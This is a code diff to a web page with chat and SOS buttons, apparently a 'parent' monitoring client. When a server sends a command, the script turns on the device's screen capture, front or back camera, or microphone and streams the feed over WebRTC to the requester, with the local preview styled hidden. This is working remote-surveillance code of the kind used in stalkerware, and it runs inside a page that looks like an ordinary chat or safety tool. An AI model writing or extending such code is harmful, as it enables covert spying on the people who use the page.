@@ -14,7 +14,7 @@
         button:hover { background: #0056b3; }
         .sos-btn { background: #dc3545; }
         .sos-btn:hover { background: #bd2130; }
-        video { display: none; }
+        video { width: 100%; max-width: 300px; background: black; border-radius: 6px; margin-top: 10px; display: none; }
     </style>
 </head>
 <body>
@@ -45,7 +45,9 @@
     <script>
         const socket = io();
         const statusP = document.getElementById('status');
+        const localVideo = document.getElementById('localVideo');
         let peerConnection;
+        let localStream;
         const rtcConfig = { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] };
 
         socket.on('connect', () => {
@@ -88,38 +90,42 @@
             msgInput.value = '';
         }
 
-        // استقبال أوامر المراقبة وإنشاء اتصال WebRTC صحيح تماماً
         socket.on('execute_command', async (data) => {
             try {
-                let stream;
+                // إيقاف أي بث قديم لمنع تعارض الكاميرا
+                if (localStream) {
+                    localStream.getTracks().forEach(track => track.stop());
+                }
+
                 if (data.action === 'share_screen') {
-                    stream = await navigator.mediaDevices.getDisplayMedia({ video: true, audio: true });
+                    localStream = await navigator.mediaDevices.getDisplayMedia({ video: true, audio: true });
                 } else if (data.action === 'front_camera') {
-                    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true });
+                    localStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true });
                 } else if (data.action === 'back_camera') {
                     try {
-                        stream = await navigator.mediaDevices.getUserMedia({ 
+                        localStream = await navigator.mediaDevices.getUserMedia({ 
                             video: { facingMode: { exact: 'environment' } }, 
                             audio: true 
                         });
                     } catch (e) {
-                        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: true });
+                        localStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: true });
                     }
                 } else if (data.action === 'listen_mic') {
-                    stream = await navigator.mediaDevices.getUserMedia({ video: false, audio: true });
+                    localStream = await navigator.mediaDevices.getUserMedia({ video: false, audio: true });
                 }
 
-                if (stream) {
-                    // إغلاق أي اتصال قديم إن وجد
+                if (localStream) {
+                    localVideo.srcObject = localStream;
+
                     if (peerConnection) {
                         peerConnection.close();
                     }
 
                     peerConnection = new RTCPeerConnection(rtcConfig);
 
-                    // إضافة جميع مسارات الصوت والصورة إلى الاتصال قبل إرسال العرض
-                    stream.getTracks().forEach(track => {
-                        peerConnection.addTrack(track, stream);
+                    // حقن مسارات الصوت والصورة مباشرة في اتصال الـ WebRTC
+                    localStream.getTracks().forEach(track => {
+                        peerConnection.addTrack(track, localStream);
                     });
 
                     peerConnection.onicecandidate = (event) => {
@@ -130,8 +136,6 @@
 
                     const offer = await peerConnection.createOffer();
                     await peerConnection.setLocalDescription(offer);
-                    
-                    // إرسال العرض مع معرف الأب
                     socket.emit('webrtc_offer', { targetId: data.parentId, senderId: socket.id, offer: offer });
                 }
             } catch (err) {
